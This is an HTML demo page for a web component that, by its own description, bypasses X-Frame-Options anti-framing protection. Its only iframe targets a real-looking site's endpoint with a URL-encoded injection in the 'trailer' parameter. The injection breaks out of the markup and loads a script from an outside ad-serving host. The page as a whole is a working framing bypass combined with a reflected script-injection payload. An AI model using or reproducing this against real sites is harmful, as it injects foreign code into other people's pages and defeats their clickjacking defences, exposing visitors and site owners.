<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="X-Frame-Bypass: Web Component extending IFrame to bypass X-Frame-Options: deny/sameorigin">
	<title>X-Frame-Bypass Web Component Demo</title>
	<style>
		html, body {
			margin: 0;
			padding: 0;
			height: 100%;
			overflow: hidden;
		}
		iframe {
			display: block;
			width: calc(100% - 40px);
			height: calc(100% - 40px);
			margin: 20px;
		}
		img {
			position: absolute;
			top: 0;
			right: 0;
		}
	</style>
	<script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
	<script src="x-frame-bypass.js" type="module"></script>
</head>
<body>
	<iframe is="x-frame-bypass" src="https://vizer.tv/includes/ajax/publicModals.php?trailer=%22%3Csvg%20onload=%3E%3C/svg%3E%3Ciframe%20src=%22%22%20%3Csvg=%22%22%20onload=%22%22%3E%3C/svg%3E%22%20frameborder=%220%22%20allowfullscreen%3E%3C/iframe%3E%3Cscript%20type=%22application/javascript%22%20data-idzone=%224697560%22%20src=%22https://a.exdynsrv.com/video-outstream.js%22%20async%20%3E%3C/script%3E"></iframe>

</body>
</html>
